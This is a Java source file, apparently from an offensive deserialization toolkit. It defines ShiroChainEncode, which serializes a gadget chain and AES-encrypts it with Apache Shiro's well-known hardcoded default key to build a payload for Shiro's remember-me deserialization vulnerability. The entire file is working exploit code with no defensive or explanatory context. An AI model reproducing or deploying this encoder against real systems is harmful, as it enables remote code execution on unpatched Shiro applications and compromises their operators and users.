package org.erosion2020.encoder;

import org.apache.commons.lang3.ArrayUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

@Encoder(type="shiro")
public class ShiroChainEncode extends ChainEncoder {

    private static final String defaultKey = "kPH+bIxk5D2deZiIxcaaaA==";

    ShiroChainEncode(String[] config) {
        super(ArrayUtils.isEmpty(config)?new String[]{defaultKey}:config);
    }

    @Override
    public Object serialize(Object chain) throws Exception {
        if(chain == null){
            throw new Exception("[ERROR] The chain is invalid.");
        }
        String config = getConfig()[0];
        AesCipherService aes = new AesCipherService();
        byte[] key = null;
        try{
            key = Base64.getDecoder().decode(config == null?defaultKey:config);
        }catch (Exception e){
            throw new Exception("[ERROR] The shiro key is invalid.");
        }

        byte[] payload = null;
        if(chain instanceof byte[]){
            payload = (byte[])chain;
        }else {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(chain);
            oos.close();
            payload = barr.toByteArray();
        }
        ByteSource ciphertext = aes.encrypt(payload, key);
        return ciphertext.toString();
    }
}
